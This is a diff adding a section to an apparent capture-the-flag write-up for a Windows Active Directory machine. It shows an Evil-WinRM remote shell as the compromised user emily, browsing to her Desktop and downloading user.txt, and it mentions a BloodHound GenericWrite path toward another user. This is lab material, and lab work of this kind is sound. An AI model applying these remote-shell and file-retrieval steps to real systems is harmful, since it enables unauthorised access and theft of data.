@@ -722,3 +722,26 @@ psafe3 file output:
 
 bloodhound generic write on user ethan from user emily:
 ![image](https://github.com/user-attachments/assets/e15de180-ee85-4b8c-b790-ea2a7af93c9f)
+
+user flag:
+```bash
+*Evil-WinRM* PS C:\Users\emily\Documents> cd ..
+*Evil-WinRM* PS C:\Users\emily> cd Desktop
+*Evil-WinRM* PS C:\Users\emily\Desktop> ls
+
+
+    Directory: C:\Users\emily\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
+-ar---         12/7/2024  10:07 PM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\emily\Desktop> download user.txt
+                                        
+Info: Downloading C:\Users\emily\Desktop\user.txt to user.txt
+                                        
+Info: Download successful!
+```
